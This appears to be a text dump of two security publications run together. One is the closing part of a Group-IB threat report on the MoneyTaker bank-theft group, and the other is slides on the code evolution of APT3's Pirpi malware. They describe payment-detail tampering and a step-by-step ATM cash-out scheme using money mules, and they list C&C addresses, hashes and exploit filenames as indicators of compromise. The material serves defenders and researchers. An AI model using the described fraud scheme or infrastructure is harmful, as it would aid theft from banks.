\n\ufb01PayeePersonalAcc\ufb02 field is verified. The values of these fields \nare compared with HackAcc in the \ufb01Xml-Resultfile\ufb02 file (this \nis the file in which the XML module stores information about \nreplacements).\nIf the values match, then the module restores the original \npayment details.\nThis means that the payment order is sent and accepted for \nexecution with the fraudulent payment details, and the responses \ncome as if the payment details were the initial ones. This gives \ncybercriminals extra time to mule funds before the theft is \ndetected.\nTEMPORARY FILE MODULE \u0152 TXT.EXE\nThe main module is also able to start the TXT module by passing \nthe name of the temporary file of the AWS CBR as an argument. \n\nHowever, we have not managed to obtain this module and do not \n\nknow its function.\nAll MoneyTaker modules do not have information displayed \nand actively record their activity to log files. There is also the \npossibility of a test run, which is performed after installation on a \n\ncomputer with AWS CBR. Hackers use it to control the program \noperation.\nAfter this attack, they did not conduct a single new attack on the \nAWS CBR using this tool.\n 24\nIn November 2017, they again attacked another bank in Russia. \nHackers managed to gain access to the servers and workstations \n\nof AWS CBR operators, but they were not able to use MoneyTaker \n\nmalware because the server was in a completely isolated \n\nsegment.\nAfter an unsuccessful attempt to steal money through the system \nof interbank transfers, they switched their focus to card processing \n\nas in the the US based attacks.\n 25\nThrough analysis of the attackers\u2122 infrastructure, we \ndiscovered that they always try to steal internal banking system \n\ndocumentation: administrator guides, internal instructions and \n\nregulations, change request forms, transaction logs, etc.\nWe did not find any evidence of successful attacks on SWIFT \nconducted by this group, nor did we find any connections with \nalready known incidents, for example, in Hong Kong, Ukraine, or \n\nTurkey. However, we know that in addition to the abovementioned \n\ndocuments these threat actors search for and copy documents \n\nrelated to SWIFT, which may indicate pending attacks on this \n\nsystem. Now hackers have the following documents at their \n\ndisposal:\n\u0141\n \nInstallation and Administration Guide for SWIFT Alliance \nAccess 7.0\n\u0141\n \nSecurity Guide for SWIFT Alliance Access 7.0\n\u0141\n \nSystem Administrator Procedures, for Ocean Systems\u2122 wire \n\ntransfer product FedLink\n\u0141\n \nUser Procedures Manual, for Ocean Systems\u2122 wire transfer \nproduct FedLink\nThe two last mentioned documents are of interest, because \nthey describe how to make transfers through SWIFT using the \n\nFedLink system. According to FedLink\u2122s official website, now they \n\nhave more than 200 customers in the US and Latin America. We \n\nassume that banks in Latin America may become the next target of \n\nthis group.\nPOTENTIAL ATTACKS \nON SWIFT\n07\n 26\nThe first attack on card processing that we attribute to this group \nwas conducted in May 2016. \nHaving gained access to the bank network, the attackers \ncompromised the workstation of First Data\u2122s STAR network portal \noperators, making the changes required and withdrawing the \nmoney. In January 2017, the attack was repeated in another bank. \nFocusing on card processing systems enables the attackers to \ncarry out attacks that are easier and safer for \u201amoney mules\u2122 who \n\nprovide cash withdrawals. The attackers are in one country, the \n\nvictim bank is in another and cash is withdrawn by mules in a third \n\nlocale. This scheme is simple to implement and does not require \n\nmuch investment from attackers. That explains its increased usage \n\nby cybercriminal groups such as Moneytaker and Cobalt.\nThe scheme is extremely simple:\n\u0141\n \nAfter taking control over a bank network, the attackers \nchecked if they could connect to the card processing system.\n\u0141\n \nThey legally opened or bought cards of the bank whose IT \nsystem they had hacked. \n\u0141\n \nMoney mules \u0152 criminals who withdraw money from ATMs \u0152 \nwith previously activated cards deployed and waited for the \n\noperation to begin.\n\u0141\n \nAfter getting into the card processing system, the attackers \nremoved or increased cash withdrawal limits for the cards held \nby the mules. \n\u0141\n \nThey removed overdraft limits, which made it possible to go \noverdrawn even with debit cards.\n\u0141\n \nUsing these cards, the mules withdrew cash from ATMs, one \nby one. The average loss caused by one attack was about \n$500,000 USD.\nAs in the case with the attacks on SWIFT, they gather internal \ndocuments from banks in order to get a better understanding of \n\nhow to handle certain systems.\nATTACK ON CARD \nPROCESSING\n08\nFigure. Fragment on Credit limit \nincrease from the card processing \n\nguidelines\nFigure. Screenshot of the \n\nguidelines on card transaction \n\nprocessing via terminal \n 27\nThrough analysis of the C&C server used to conduct targeted \nattacks on banks, we discovered two related files: \nThe c4c.exe file uses the following address as the C&C server: \nh\u02c6\u02c6p://82.146.54.5/api/cfg.ashx\nThe sample was distributed online as a document named \nfedwire_22127061503_output_report.doc (2818a0c63d729cb\n1f2d223e15c762209), which was downloaded from the server \n\nhxxp://188.120.235.201/fce2857010e1.exe (369ad5f7bc9a555f3395059\n978c720bb)\nRelated indicators:\nUSING BANKING \nTROJANS\n09\nName\nMD5\nType\nc4c.exe\nc7d20b726708a441db3d864457a097833654719513990f823b1deb7c48b65472\nCitadel\ncbcs.exe\ne01e9cdfff085393362e1e2e3ec8cae33c536053760e65c7617d5a0dfd005874\nCitadel Backconnect Server\nc4c.exe\n82.146.54.5\nCitadel\nfedwire_22127061503_output_report.doc\n188.120.235.201\nDownloading the file fce2857010e1.exe \nfce2857010e1.exe\n82.146.54.5\nCitadel\noperating_circular_6_app_e1.docm\nwww.riverbed.com\n188.120.235.201\n\n188.120.230.218\n\n82.146.54.5\n 28\nName\nMD5\nType\nEmployeeID-847267.doc\n83d21d808f7408ebcb3947cb88366172\nDocument with marcos\n203.exe\n70d8729ca630dd3b0f9a62998642ec76\nKronos\nhxxp://networkupdate[.]online/kbps/upload/c1c06f7d[.]exe\nSmoke Loader\nhxxp://networkupdate[.]online/kbps/upload/1f80ff71[.]exe\nSmoke Loader\nhxxp://networkupdate[.]online/kbps/upload/a8b05325[.]exe\nScanPOS\nThrough analysis of the C&C server used to conduct targeted \nattacks, we discovered two related files:\nIn November 2016 researchers at Proofpoint reported large email \nphishing campaigns, primarily targeting companies in the UK and US. \n\nThe email messages contained a malicious document, or a phishing link. \nWhen the victim opened the attached document, a macro which \ndownloaded Kronos banking Trojan form the URL\n\nIn the investigated case the \ufb01203.exe\ufb02 file was downloaded from the \n\nfollowing link:\n\n\n\n\n71dbd6420c0c62ad59cbadcd7d506614bc87d)\nThe Kronos banking Trojan reported by Proofpoint installed three \n\npayloads from the following URLs:\nScanPOS is a unique point-of-sale (PoS) malware. Upon execution, \nScanPOS grabs information about the current running processes and \n\ncollects the user name and privileges on the infected system. That said, \n\nit is primarily designed to dump process memory and search for payment \ncard track data. The Trojan checks any collected data using Luhn\u2122s \nalgorithm for validation and then sends it outbound to the C&C server.\nThe C&C address for ScanPOS was hxxp://invoicesharepoint[.]com/\ngateway[.]php\nUSING POS \nTROJANS\n10\n 29\nRun an indicator check-up in the following section\nOperating system security\n\u0141\n \nProhibit any remote logon to the system (RDP, SMB, RPC) for \nlocal administrators. We recommend that you use only Logon \n\ntype 2 (interactive):  https://technet.microsoft.com/en-ie/library/\n\ncc787567(v=ws.10).aspx \n\u0141\n \nConfigure the following parameter in the registry on all PCs \n\nrunning Windows 7 (and up) and all the servers using Windows \n\n2008R2:\nHKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/\n\nSecurityProviders/WDigest/UseLogonCredential=0 \nThis registry key prohibits storing unencrypted passwords in \n\nRAM (which are usually leveraged by Mimikatz) \n\u0141\n \nProhibit a standard local administrator with an ID=500 (which \nis vulnerable pass-the-hash attack). Add another administrator \nand install updates to protect against Pass the hash attacks: \n\nhttps://technet.microsoft.com/library/security/2871997#ID0E3D \n\u0141\n \nMinimize and completely deny granting administrator \n\nprivileges for users of local PCs, especially for users who work \n\nwith external information systems.\n\u0141\n \nUse a different local Administrator account password on \n\nevery node, which must not match any domain administration \n\ncredentials. If this rule is not currently applied \u0152 change all the \n\npasswords, make them unique, long and complex. Securely \n\nmanage local Administrator passwords by using specialized \n\ntools, such as Microsoft\u2122s Local Administrator Password \n\nSolution (LAPS).\n\u0141\n \nDeny granting domain administrator privileges for common \n\nuser accounts. In order to perform domain administrative \n\ntasks, create a separate additional domain user account for \n\neach administrator, while preventing them from performing \n\ndaily routine administrator work on their PCs under an account \n\nwith administrative rights.\nRECOMMENDATIONS\n11\n 30\n\u0141\n \nIsolate hosts in the same VLAN, so that one workstation would \nnot be able to gain access to another one on network levels \n\nL2/L3, and could access shared network segments (printers, \n\nservers, etc.).\n\u0141\n \nProvide timely updates of OS, antivirus software and other \napplications.\n\u0141\n \nConfigure the service accounts with the minimum set of \npermissions necessary for them to function properly (with \n\nrespect to logon type and group membership). Strictly prohibit \n\nadding service accounts to the local administrators group \n\nunless absolutely necessary.\n\u0141\n \nUse IDS solutions and a sandbox to analyze files. We \n\nrecommend that companies apply technology like Group-\nIB\u2122s TDS Sensor and sandbox, which are able to detect and \nprevent these types of attacks.\n \nMeasures to protect interbank transfer system, card processing \n\nand ATMs\n\u0141\n \nIsolate hosts of workstations and servers related to the \ninterbank transfer system.\n\u0141\n \nEnsure the integrity of data, system and application software \n\ndeployed on the infrastructure servers; introduce application \n\nwhitelisting on workstations.\n\u0141\n \nEnsure monitoring and notifications in case of anomalous time \nof access to servers and workstations by operators of financial \nsystems.\n\u0141\n \nEnsure monitoring and notifications of changes to overdraft \n\nand cash withdrawal limits.\n 31\nABOUT \nGROUP-IB\nGROUP-IB HELPS MAJOR CORPORATIONS RECOGNIZE \nAND REACT TO THE MOST SOPHISTICATED CYBER-\n\nTHREATS.\nOfficial \u02c7UROPOL \n \nand INTERPOL partner\nRecommended by the \nOrganization for Security and \n \nCo-operation in Europe (OSCE) \nMember of the World \n \nEconomic Forum\nGroup-IB Threat Intelligence has \nbeen recognized by top industry \nresearcher reports\nGroup-IB leverages its proprietary high-tech infrastructure to monitor \n\nhacker activity and extract unique data. These data is accomplished \n\nby profound human intelligence by experts who conduct incident \n\nresponse and monitor the most secretive underground hacker forums.\nComprehensive ecosystem of threat intelligence and security \nsolutions empowers organizations to identify threats sooner, \n\nrespond faster, and build more effective defenses against \n\nsophisticated cyberattacks.\nProfound human \n\nintelligence and cutting-\n\nedge technology\nProducts and services \npowered by Threat \n\nIntelligence\nEUROPOL\nWORLD \nECONOMIC \nFORUM\nIDC\nINTERPOL\nGARTNER\nFORRESTER\nNETWORK INFRASTRUCTURE\n\u0141\n \nHoneyNet and botnet analysis\n\u0141\n \nHacker community infiltration\n\u0141\n \nOpen-source monitoring\n\u0141\n \nNetwork attack trackers\n\u0141\n \nTDS Sensors\n\u0141\n \nBehavior analysis system\nEARLY WARNING SYSTEM\n\n\u0141\n \nThreat Intelligence  \n\u0141\n \nTDS\n\u0141\n \nSecure Bank\n\u0141\n \nSecure Portal\nHUMAN INTELLIGENCE \n\n\u0141\n \nForensics\n\u0141\n \nInvestigations\n\u0141\n \nMalware monitoring and research\n\u0141\n \nCERT-GIB request database\n\u0141\n \nSecurity assessment \n\u0141\n \nGroup-IB case studies\nPREVENTION\n \n\u0141\n \nSecurity audit \n\u0141\n \nCompromise Assessment \n\u0141\n \nRed Teaming  \n\u0141\n \nBrand Protection \n\u0141\n \nAntipiracy\nGLOBAL DATA EXCHANGE\n\n\u0141\n \nComputer incident response teams\n\u0141\n \nDomain registrar and hosting providers\n\u0141\n \nCyber security vendors\n\u0141\n \nCybersecurity associations\u02d8\n \n& professional\u02d8organizations\n\u0141\n \nEuropol, Interpol and law \n \nenforcement agencies\nRESPONSE 24/7/365\n\u0141\n \nComputer Emergency \nResponse Team \n \n\nCERT-GIB\nRESPONSE 24/7/365\n\u0141\n \nDigital forensics and \nmalware analysis\n\u0141\n \nIncident investigation\n\u0141\n \nFinancial and corporate \n\nInvestigation\n 32\nINDICATORS \nOF COMPROMISE\n12\nMalicious SSL certificates\nPrivilege escalation\nIssuer\nSSL fingerprint\nIP, where it was used\nMetaBank LTD\n8b7fa4ef88a303bb47240c9b8012c80507074f2e\n83.220.172.71\nYahoo Inc.\nc29d79df9b5416fd416c31e57cd525dfc23a8f66\n37.46.133.190\n172.86.121.11\nFiserv Inc\nb3dd855fc1b32757bde5c9f737808f150d6f57e6\n146.185.243.19\nMicrosoft Ltd\n98cbe44e1a30448a3ff6be38e8b277ae189f9b45\n82.146.54.5\nFederal Reserve Bank\n5fe7f5924ee2382dbfa5c8bdc6d04f0ff5d9273a\n188.120.235.201\nBank of America\n5922a06f03f6464921462c07842afb18da1577e9\n188.120.230.218\n188.120.230.235\nVMware\n7aa02d827609e0b6b3dca6d0ef82fe3a1fbe1d67\n185.141.25.222\nFile name\nSHA256\nDescription\nASLRSideChannelAttack.\nexe\n9a82aa5af19fa0a6167f87ee500856d53690c92c8c6449af54d8e5\n\nd33cf8bff4\nLPE Win10x64\ncve.bat\n7ff092853c15b51315414939c165ea9bce1f920d2d99e570d747ee7fc\n\n9fa734a\nBAT LPE executor\ncve.exe\n98b6f9172ca273deef324f032a8e992b6e6ca3c6542449a48246b3\n\n646b6c8cb6\ncve-2016-7255\ncve-2016-7255.exe\n5ec6a6c9a7233a7ff68d989d830a2249e94a2784e69d5c8a593d3\n\n345da14a6b5\ncve-2016-7255\ncve-2016-7255test.exe\ndf69966d721193e2315723dd71636b93cc76b38cfa046dce45d7aec\n\n4856f4bee\ncve-2016-7255\n 33\nKeylogger and Sreenshotter\nMalware for AWS CBR\nMeterpreter\nFile name\nSHA256\nDescription\nperfmon.exe\n2049df4a5f92709bad14a7e2b8c0cfcb6ede2f71009cb3483892108e949800e6\nDropper of Keylogger/ \nScreenshotter\nperfmonpe.exe\nff3c84266fdba3638b9fc1a41cab87cf4021eb531954343d1a328b307b586ac6\nDropper of Keylogger/ \nScreenshotter\nrecycler.exe\n206aec8132cbb2497553b1f2c1c40733188929bad2feb0640e99474b327e564b\nDropper of Keylogger/ \n\nScreenshotter\nxkey.exe\nb2e02579cf0e9c2a57bff806b57d6b868d5d411264d38ff7ac7e6b47d0d2a33d\nKeylogger/ Screenshotter\nxkey_x86.dll\n60e6652ae39ecd9314ba0e7936b41ca813737183c4eaa96dce0b4a36a90375dd\nKeylogger/ Screenshotter\nhkcmd.exe\n4672E624C5210A523AA0A0B56DB677B6\nKeylogger stores logs in snmp.dat\nFile name\nSHA256\nDescription\nmain.exe\nigfxserv.exe\n77003E4E6EB091643DFF0C0F967D8C9001DE7D8689E493D67D0F4275\nCC189083\nMain module\nxml.exe\n5F6D1B1728EAE505B23C7FD16E04AD534D44465AFE4C3FD420475CAB2\n\n5B61B02\nModule which replaces payment \n\ndata\ned.exe\n2B365805E50A09B0149FF2E706CB19D7FAC71FC6B1D1273BE8EB3E93875\n\n0C23B\nModule which replaces / hides \n\nfraud transactions \ntxt.exe\nwas not restored\nModule which operates with \n\ntemp files \nFile name\nSHA256\ntest64.exe\n187E4204036445E6A86DB015166F271C472F40CC7D0224B3995686856917D64C\ntest64.exe\n642eae9a42c06265444577fc28165dab99efe3495eeae1be95b8608867f8276d\ntest32.exe  \n649fc133ddacc38fb7f2a730f261365e03b84de7f8ccd942573165ba5ff62728\nasys.exe\n6ce7c4cb9e51116a4565e9b2e129335a4d23cfc51a32080aa9f25689cb1c6ef2\ncmd.exe\n7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f\nlaunch-paranoid-stageless3.\n\nexe\nf98b0220a11b57e3c812e7f86f5e5c3f8bbdb5d5ce9dc7b721e28a7f28ecb1ef\nmencstager.exe\n7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f\nmsc.exe\n0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff\nmsc3.exe\n0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff\n 34\nMeterpreter related scripts\nmsc4.exe\n53c789565821b6eb64bd7f002e38b8259bde3bbbb39798c82657b2b5d59bcd9f\nmsc5.exe\n98fb846df3687b3c9c7fa66f39d6c70948e8330489be7c787e1f2c3b23f8d205\nmsc6.exe\n92afe22f494a849345b18d2b302e71a4336871a7956795a7188280e4c7bd8607\nmsc7.exe\n73b8ed8f14ec2260ae332603f723a5eb0a52c4c997454904e3d5ff254a27a6e6\nputtyx.exe\ne19e48ed659981c4d79c20f1ba9c2ab9af4fb94c67c71f64d0ea48be3ff9da97\nrc4.dll\n8a0be0a97ba19d4498b58365d36ba5461039e41f73bbd745b15b80fc21e38c3f\nrc4.exe\na7035c20c32ad4cd1cc76b211f6258fc5858e4bc43031d04e3655b38b666c0c4\nrc4.hta\n72ee03b51544002df3e25d1a730e650389bdbd5f1cff91488ed9e05944b3cb52\nFile name\nSHA256\ndebug.vbs\nc8d4ba78c89bdb1af01100518db53bf88e0120c89ba7e346e7fcda4b56a07595\ndrives.vbs\nf51d42946cc7f17114a3acc0d9678f2fa5ee4527a877b6b8071df22c26cfe6c1\ngatherNetworksInfo.vbs\na3da7fd3dd3c12f6b0f3ce7d96906e8fcdcc0817a546777a5b37b9b1d1ec954d\nlink.vbs\n701e99c1a84dd8e84b252512ff13b777a3f2135f7cdf3873086e021b19289681\nlink2.vbs\nfffd31faa176cee8c41dac2542308c3e9e553f3d7a9ce9a6422b390ffb23e511\nlink3.vbs\n2267bbf93860dd1c62da2308a3bd2a265c418af1a3257c8649f6495de6a3d392\nlink4.vbs\n5f254208721c87c274ab26ce4c21765efe56cfa65ee67bfb60c783097839f169\nlink5.vbs\n0f6bff21f72b017de70556f5f7507b470e182e7f4f5ee9d6a72f7aff0c957218\nlink6.vbs\na467d30dd3138b300a15b733a92482a9f545d217c6c7c89e5ea975eb021002f5\nlink7.vbs\ne360066239e8c19d50b625c8b935fe7f026ade845470250bf6b6aa2cb3943af0\nlmagent.vbs\n7180d79351741e8d53143e538aa46a7cc528fbae1baf9d1f95f362ef5b8d95e2\nlogon.vbs\nf51d42946cc7f17114a3acc0d9678f2fa5ee4527a877b6b8071df22c26cfe6c1\nmsdefender.bat\n8cfeb71eaaa3df217e15a449bc4656841b58a4737760d956b1c8e6039cff61e6\nOLD_winstart.vbs\n5f5ae87472013f6ec2c6d261e6675aa7b143dcaf3f5e372a51feb61a34097efe\nproxystager.bat\n3a163bb0a8abe244815836a05fab48b640ec537bd76c92b7857db18657d2a774\nps.bat\n9e9149ae6092c4a5bd4cb36cf40ec660e3ee10e76834340bf1234186315ca808\nRAVBg64.vbs\na3da7fd3dd3c12f6b0f3ce7d96906e8fcdcc0817a546777a5b37b9b1d1ec954d\nse.vbs\nff999c968bce81987cab47a02a3b176042489d82644d4c6fb13d5c8c1244cbcc\n 35\nFile name\nSHA256\nDescription\nc4c.exe\nc7d20b726708a441db3d864457a097833654719513990f823b1deb7c48b65472\nCitadel\nfce2857010e1.exe\nb75d28deeaece776fc09dbc0cd351adab1ed80ef4245f7681d4a57e47fa83fb7\nCitadel\ncbcs.exe\ne01e9cdfff085393362e1e2e3ec8cae33c536053760e65c7617d5a0dfd005874\nCitadel Backconnect Server\nFile name\nSHA256\n203.exe\n536fc552cc24733f05f5a3be333c030fc848060da978b282d67d67a7c76c0d30\nFile name\nSHA256\na8b05325.exe\n093c81f0b234c2aa0363129fdaaaf57551f161915da3d23f43a792b5f3024c1e\nCitadel\nKronos\nScanPOS\nIP Addresses\nMalware\nISP\nCountry\n46.45.171.174\nScanPOS\nSayfa Net\nTurkey\n46.45.171.174\nKronos\nSayfa Net\nTurkey\n188.120.235.201\nCitadel\nISPsystem\nRussia\n82.146.54.5\nCitadel\nISPsystem\nRussia\n82.146.54.5\nMeterpreter\nISPsystem\nRussia\n83.220.172.71\nMeterpreter\nISPsystem\nRussia\n37.46.133.190\nMeterpreter\nISPsystem\nRussia\n172.86.121.11\nMeterpreter\nRouter Hosting\nUSA\n146.185.243.19\nMeterpreter\nJust Hosting\nRussia\n188.120.235.201\nMeterpreter\nISPsystem\nRussia\n188.120.230.218\nMeterpreter\nISPsystem\nRussia\n188.120.230.235\nMeterpreter\nISPsystem\nRussia\n185.141.25.222\nMeterpreter\nHostSailor\nRomania\n185.141.25.81\nMeterpreter\nHostSailor\nRomania\n185.86.149.140\nMeterpreter\nVirtual Server hosting\nLatvia\n212.117.180.238\nMeterpreter\nroot S.A.\nLuxembourg\n155.94.238.15\nMeterpreter\nHostBrew, LLC\nUSA\nIP Addresses\n 36\nPreventing and \ninvestigating cybercrime \n\nsince 2003\nwww.group-ib.com\nblog.group-ib.com\ninfo@group-ib.com\n\n+44 2036085907\ntwitter.com/groupib_gib\n\nlinkedin.com/organization/1382013\n ", "APT3 Uncovered: \nThe code evolution of \nPirpi\nYour functions are showing (and leaving a trail)\nMicah Yates \n-\n@m1k4chu\nPalo Alto Networks\n Your functions are showing\n\nPersistent Code Reuse\n\nFinding The Trail\n\nPirpi.201x vs Operation Clandestine \nDoubleTap\n\nJust give me all the \nPirpi\nyou have\n\nEXEProxy\n Persistent Code Reuse:\nfunction_1\n Persistent Code Reuse\n\nWhat is \nPirpi\n?\n\nTargeted malware delivered via 0\n-\ndays\n\n(CVE\n-\n2010\n-\n3962)\n\n(CVE\n-\n2014\n-\n1776)\n\n(CVE\n-\n2014\n-\n4113)\n\n(CVE\n-\n2014\n-\n6332)\n\n(CVE\n-\n2015\n-\n3113)\n\n(CVE\n-\n2015\n-\n5119)\n\nAppended to a valid gif\n\nObfuscated Command and Control\n\nCompromised infrastructure\n Finding a Trail\n\nWhy are you doing this?\n\n\n\n\n\nPick 2 binaries by:\n\nFamily\n\nCompile Times\n\nFile Size\n\n% similarity (\nssdeep\n)\n It \nstarted\nout \nwith\na \ndiff\n, how \ndid\nit\nend up \nlike\nthis\n?\n\nInspect Binaries w/ IDA Tools\n\nBindiff\n\nHex Rays\n\nIDAScope\n\nPlohmann\n/\nHanel\n\nBindiff\ntwo known \nPirpi\nsamples\n\nfb838cda6118a003b97ff3eb2edb7309 \n\ne33804e3e15920021c5174982dd69890\n It was only a diff\n It was only a diff\n Aside:\nPutting the FUN in Function\n Pirpi.201x vs \nOperation\nClandestine \nDoubleTap\n Pirpi.201x vs \nOperation\nClandestine \nDoubleTap\n Just give me all the \nPirpi\nyou have: \nfunction_1\nCompile\nMD5\nBeacon\n2007 01\n3f5d79b262472a12e3666118a7cdc2ca\nwww.msnmessengerupdate.com/index31382/f2ae95b93i97.bmp\n2008 01\n6bdee405ed857320aa8c822ee5e559f2\nwww.msnmessengerupdate.com/image19582/7e7e7eb7fi7f.gif\n2009 03\ne22d02796cfb908aaf48e2e058a0890a\nwww.office2008updates.com/dream/dream.php?\n2009 10\n1fa0813be4b9f23613204c94e74efc9d\nini.msnmessengerupdate.net/smart/smartmain.php?\n2010 01 \n914e9c4c54fa210ad6d7ed4f47ec285f\nini.office2005updates.net/smart/smartmain.php?\n2013 01\n44bd652a09a991100d246d8280cac3ac\n218.42.147.106/\nbussinesses\n/\ncaetrwet\n/\n2014 04\nb48e578f030a7b5bb93a3e9d6d1e2a83\nproduct.sorgerealty.com\n2016 04\nf683cf9c2a2fdc27abff4897746342c4\nste.mullanclan.com\n Just give me all the \nPirpi\nyou have: \nfunction_1\n0\n10\n20\n30\n40\n50\n60\n70\n80\n90\n100\n2006 03\n2007 01\n2007 10\n2008 01\n2008 02\n2008 03\n2008 04\n2008 05\n2008 06\n2008 07\n2008 09\n2008 11\n2008 12\n2009 03\n2009 05\n2009 07\n2009 08\n2009 09\n2009 10\n2009 11\n2009 12\n2010 01\n2010 02\n2010 03\n2010 05\n2010 06\n2010 07\n2010 08\n2010 10\n2011 01\n2011 04\n2011 05\n2011 06\n2011 07\n2011 08\n2011 10\n2011 11\n2011 12\n2012 01\n2012 04\n2012 05\n2012 09\n2012 11\n2012 12\n2013 01\n2013 02\n2013 07\n2013 09\n2013 12\n2014 04\n2014 05\n2014 07\n2014 08\n2014 09\n2015 01\n2015 06\n2015 07\n2015 09\n2016 03\n2016 04\n2016 08\n2017 02\nUNIQUE SAMPLES\nCOMPILE YEAR AND MONTH\n  function_1 \n-\nminor versions\n0\n10\n20\n30\n40\n50\n60\n70\n80\n90\n100\n2006 03\n2007 01\n2007 10\n2008 01\n2008 02\n2008 03\n2008 04\n2008 05\n2008 06\n2008 07\n2008 09\n2008 11\n2008 12\n2009 03\n2009 05\n2009 07\n2009 08\n2009 09\n2009 10\n2009 11\n2009 12\n2010 01\n2010 02\n2010 03\n2010 05\n2010 06\n2010 07\n2010 08\n2010 10\n2011 01\n2011 04\n2011 05\n2011 06\n2011 07\n2011 08\n2011 10\n2011 11\n2011 12\n2012 01\n2012 04\n2012 05\n2012 09\n2012 11\n2012 12\n2013 01\n2013 02\n2013 07\n2013 09\n2013 12\n2014 04\n2014 05\n2014 07\n2014 08\n2014 09\n2015 01\n2015 06\n2015 07\n2015 09\n2016 03\n2016 04\n2016 08\n2017 02\nUNIQUE SAMPLES\nCOMPILE YEAR AND MONTH\nv6\nv5\nv4\nv3\nv2\nv1\n V1 \n-\n2007\nMD5:\n98011f5b7b957a142f14cbda57a5ea82\n@00401FC0\nV2 \n-\n2008\nMD5\n:\n272cb6c16e083ca143d40c63005753a2\n@00403110\nV3 \n\n2006 \nMD5:\nacd8d34d8360129df1c8d03f253ba747\n@100016A0\nfunction_1 \n-\nminor versions\nfunction_1 \n-\nminor versions\n V4 \n-\n2014\nMD5:\nc006faaf9ad26a0bd3bbd597947da3e1\n@0040B320\nV5 \n-\n2016\nMD5:\nf683cf9c2a2fdc27abff4897746342c4\n@00401D60\nV6 \n-\n2017\nMD5\n:\n07b4d539a6333d7896493bafd2738321\n@00404A20\nfunction_1 \n-\nminor versions\n function_2\n function_2\n0\n10\n20\n30\n40\n50\n60\n70\n80\n90\n100\n2006 03\n2007 01\n2007 10\n2008 01\n2008 02\n2008 03\n2008 04\n2008 05\n2008 06\n2008 07\n2008 09\n2008 11\n2008 12\n2009 03\n2009 05\n2009 07\n2009 08\n2009 09\n2009 10\n2009 11\n2009 12\n2010 01\n2010 02\n2010 03\n2010 05\n2010 06\n2010 07\n2010 08\n2010 10\n2011 01\n2011 04\n2011 05\n2011 06\n2011 07\n2011 08\n2011 10\n2011 11\n2011 12\n2012 01\n2012 04\n2012 05\n2012 09\n2012 11\n2012 12\n2013 01\n2013 02\n2013 07\n2013 09\n2013 12\n2014 04\n2014 05\n2014 07\n2014 08\n2014 09\n2015 01\n2015 06\n2015 07\n2015 09\n2016 03\n2016 04\n2016 08\n2017 02\nUNIQUE SAMPLES\nCOMPILE YEAR AND MONTH\npirpi_version_check\n function_3\n function\n_3\n0\n5\n10\n15\n20\n25\n30\n35\n40\n45\n2006 03\n2007 01\n2007 10\n2008 01\n2008 02\n2008 03\n2008 04\n2008 05\n2008 06\n2008 07\n2008 09\n2008 11\n2008 12\n2009 03\n2009 05\n2009 07\n2009 08\n2009 09\n2009 10\n2009 11\n2009 12\n2010 01\n2010 02\n2010 03\n2010 05\n2010 06\n2010 07\n2010 08\n2010 10\n2011 01\n2011 04\n2011 05\n2011 06\n2011 07\n2011 08\n2011 10\n2011 11\n2011 12\n2012 01\n2012 04\n2012 05\n2012 09\n2012 11\n2012 12\n2013 01\n2013 02\n2013 07\n2013 09\n2013 12\n2014 04\n2014 05\n2014 07\n2014 08\n2014 09\n2015 01\n2015 06\n2015 07\n2015 09\n2016 03\n2016 04\n2016 08\n2017 02\nUNIQUE SAMPLES\nCOMPILE YEAR AND MONTH\npirpi_cmdline_createproc\n EXEProxy\n\nb94bcffcacc65d05e5f508c5bd9c\n950c\n\nContains function_1\n\nContains Anti\n-\nDisasm\n\nOpenSSL included\n\nRequires \ncmd\nline \nparams\nto \nrun\n EXEProxy\n:\npirpi_EXEPROXY\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n2006 03\n2007 01\n2007 10\n2008 01\n2008 02\n2008 03\n2008 04\n2008 05\n2008 06\n2008 07\n2008 09\n2008 11\n2008 12\n2009 03\n2009 05\n2009 07\n2009 08\n2009 09\n2009 10\n2009 11\n2009 12\n2010 01\n2010 02\n2010 03\n2010 05\n2010 06\n2010 07\n2010 08\n2010 10\n2011 01\n2011 04\n2011 05\n2011 06\n2011 07\n2011 08\n2011 10\n2011 11\n2011 12\n2012 01\n2012 04\n2012 05\n2012 09\n2012 11\n2012 12\n2013 01\n2013 02\n2013 07\n2013 09\n2013 12\n2014 04\n2014 05\n2014 07\n2014 08\n2014 09\n2015 01\n2015 06\n2015 07\n2015 09\n2016 03\n2016 04\n2016 08\n2017 02\nUNIQUE SAMPLES\nCOMPILE YEAR AND MONTH\npirpi_EXEPROXY\n EXEProxy\n2: Electric Boogaloo\n\n4d3874480110ba537b383\n9cb8b416b50\n\nContains \nfunction_1\n\nServer tool\n\nRequires \nCmd\nLine \nParams\n\nNo other notable \nanchor functions\n\">\nLtime\n\n\"%2d:%2d:%2d >\nCback\n\n\">\nLTime\n\n\">\nCback\n: %s:%d\" \n\"H:%s \" \n\"Ok. \" \n\"K:%d\" \n EXEProxy\n2: Electric Boogaloo\n\na85f9b4c33061ee724e59291242b9e86\n\nOpenSSL Server\n\nContains Public/Private Keys\n In Summary:\n\nSome families never change\n\nAnchor Functions are Fun!\n\nUse public info\n\nPirpi\nmalware active since at least 2006\n\nUnintended findings\n \nThanks:\n\nRichard Wartell \n\nPalo Alto Networks\n\nMike Scott \n\nPalo Alto Networks\n\nBiblio\n:\n\nMITRE:\n\nhttps://attack.mitre.org/wiki/Software/S0063\n\nFireEye:\n\nhttps://www.fireeye.com/blog/threat\n-\nresearch/2010/11/ie\n-\n0\n-\nday\n-\nhupigon\n-\njoins\n-\nthe\n-\nparty.html\n\nhttps://www.fireeye.com/blog/threat\n-\nresearch/2014/06/clandestine\n-\nfox\n-\npart\n-\ndeux.html\n\nhttps://www.fireeye.com/blog/threat\n-\nresearch/2014/11/operation_doubletap.html\n\nhttps://www.fireeye.com/blog/threat\n-\nresearch/2015/06/operation\n-\nclandestine\n-\nwolf\n-\nadobe\n-\nflash\n-\nzero\n-\nday.html\n\nSymantec:\n\nhttps://www.symantec.com/connect/blogs/new\n-\nie\n-\nzero\n-\nday\n-\nused\n-\ntargeted\n-\nattacks\n\nhttps://www.symantec.com/connect/blogs/buckeye\n-\ncyberespionage\n-\ngroup\n-\nshifts\n-\ngaze\n-\nus\n-\nhong\n-\nkong\n\nhttp://www.symantec.com/content/en/us/enterprise/media/security_response/docs/Symantec\n-\nBuckey